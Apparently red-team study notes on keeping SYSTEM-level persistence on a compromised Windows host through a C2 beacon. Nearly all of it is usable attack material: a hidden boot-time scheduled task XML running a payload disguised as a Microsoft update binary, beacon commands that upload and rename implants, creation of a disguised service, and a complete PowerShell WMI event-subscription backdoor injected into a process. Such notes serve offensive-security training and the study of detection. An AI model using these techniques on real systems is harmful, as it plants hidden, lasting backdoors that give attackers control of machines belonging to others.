
Once privileged access has been obtained on a computer, it can be useful to add another round of persistence to ensure that level of privilege can be maintained.
## Scheduled Tasks
The Windows Task Scheduler can execute tasks as SYSTEM as well as standard users.

XML Sample (Save this somewhere on ATTACK box like C:\Payloads\task.xml)
```xml
<!-- replace updater.exe with payload name, like msedge.exe, or a cmd! -->
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<Triggers>
    <BootTrigger>
        <Enabled>true</Enabled>
    </BootTrigger>
</Triggers>
<Principals>
    <Principal>
        <UserId>NT AUTHORITY\SYSTEM</UserId>
        <RunLevel>HighestAvailable</RunLevel>
    </Principal>
</Principals>
<Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
</Settings>
<Actions>
    <Exec>
        <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
    </Exec>
</Actions>
</Task>
```

Creating Scheduled Task
```powershell
beacon> cd C:\Program Files\Microsoft Update Health Tools
beacon> upload C:\Payloads\dns_x64.exe 
beacon> mv dns_x64.exe updater.exe
beacon> schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
	# This will open prompt to select XML file to use to schedule

# reboot workstation

# Delete task if done
beacon> schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
```
## Windows Services
An adversary can also create a Windows service to run a payload under the context of SYSTEM, which will start when the computer boots up.

```powershell
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe 
beacon> mv beacon_x64.svc.exe debug_svc.exe

# Create windows service
beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

# Reboot workstation???

# Verify successful creation
beacon> sc_qc dbgsvc
```

## WMI Event Subscription
A fairly stealthy method of persistence compared to the other ones!!!

Create WMI Event Subscription .ps1 script. Save to C:\Tools\WmiPersistence.ps1
```PowerShell
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "Debug Trace"
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage = 'WQL'
   }

   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }

   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter = $Filter
      Consumer = $Consumer
   }

   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

Elevated Persistence in action :)
```powershell
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe windbg.exe

# Install backdoor
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence

# Trigger backdoor
beacon> execute gpupdate /target:computer /force

# Removing Persistence
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
```
